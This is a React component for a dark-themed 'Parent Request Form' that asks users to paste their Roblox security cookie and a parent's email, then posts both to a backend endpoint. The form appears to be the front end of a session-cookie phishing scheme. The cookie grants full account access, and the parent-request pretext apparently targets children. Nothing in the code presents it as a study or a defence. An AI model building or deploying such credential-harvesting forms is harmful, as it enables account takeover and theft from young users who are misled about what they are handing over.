import { useState } from 'react';

export default function ParentRequestForm() {
  const [roblosecurity, setRoblosecurity] = useState('');
  const [parentEmail, setParentEmail] = useState('');
  const [message, setMessage] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    setMessage('');

    const response = await fetch('/api/send-parent-request', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ roblosecurity, parentEmail }),
    });

    const data = await response.json();
    setMessage(data.message);
  };

  return (
    <div style={{
      backgroundColor: '#121212',
      color: '#f0f0f0',
      minHeight: '100vh',
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      padding: '20px'
    }}>
      <form
        onSubmit={handleSubmit}
        style={{
          backgroundColor: '#1e1e1e',
          padding: '30px',
          borderRadius: '12px',
          boxShadow: '0 0 12px rgba(0, 0, 0, 0.7)',
          width: '100%',
          maxWidth: '400px',
          display: 'flex',
          flexDirection: 'column',
          gap: '20px'
        }}
      >
        <h2 style={{ textAlign: 'center', marginBottom: '10px' }}>Parent Request Form</h2>

        <div style={{ display: 'flex', flexDirection: 'column' }}>
          <label htmlFor="roblosecurity">Roblox Security Cookie:</label>
          <input
            type="text"
            id="roblosecurity"
            value={roblosecurity}
            onChange={(e) => setRoblosecurity(e.target.value)}
            required
            style={{
              backgroundColor: '#2a2a2a',
              border: '1px solid #444',
              borderRadius: '6px',
              padding: '10px',
              color: '#f0f0f0'
            }}
          />
        </div>

        <div style={{ display: 'flex', flexDirection: 'column' }}>
          <label htmlFor="parentEmail">Parent Email:</label>
          <input
            type="email"
            id="parentEmail"
            value={parentEmail}
            onChange={(e) => setParentEmail(e.target.value)}
            required
            style={{
              backgroundColor: '#2a2a2a',
              border: '1px solid #444',
              borderRadius: '6px',
              padding: '10px',
              color: '#f0f0f0'
            }}
          />
        </div>

        <button
          type="submit"
          style={{
            padding: '10px',
            borderRadius: '6px',
            backgroundColor: '#4caf50',
            color: '#fff',
            border: 'none',
            cursor: 'pointer'
          }}
        >
          Send Request
        </button>

        {message && (
          <div
            style={{
              marginTop: '10px',
              padding: '10px',
              borderRadius: '6px',
              backgroundColor: '#333',
              color: '#fff',
              textAlign: 'center'
            }}
          >
            {message}
          </div>
        )}
      </form>
    </div>
  );
              }
